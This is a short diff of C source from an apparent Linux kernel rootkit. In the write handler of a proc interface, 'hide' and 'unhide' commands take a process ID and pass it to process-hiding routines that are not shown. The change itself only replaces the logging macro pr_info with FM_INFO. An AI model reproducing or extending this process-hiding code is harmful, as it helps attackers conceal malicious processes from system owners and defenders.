@@ -40,7 +40,7 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
         kstrtol(pidstr, 10, &pid);
         kfree(pidstr);
 
-        pr_info("hide %d\n", (pid_t)pid);
+        FM_INFO("hide %d\n", (pid_t)pid);
         hide_proc(pid);
     }
     else if (strncmp(ubuf, "unhide", MIN(6, count)) == 0)
@@ -52,7 +52,7 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
         kstrtol(pidstr, 10, &pid);
         kfree(pidstr);
 
-        pr_info("unhide %d\n", (pid_t)pid);
+        FM_INFO("unhide %d\n", (pid_t)pid);
         unhide_proc(pid);
     }
     return count;
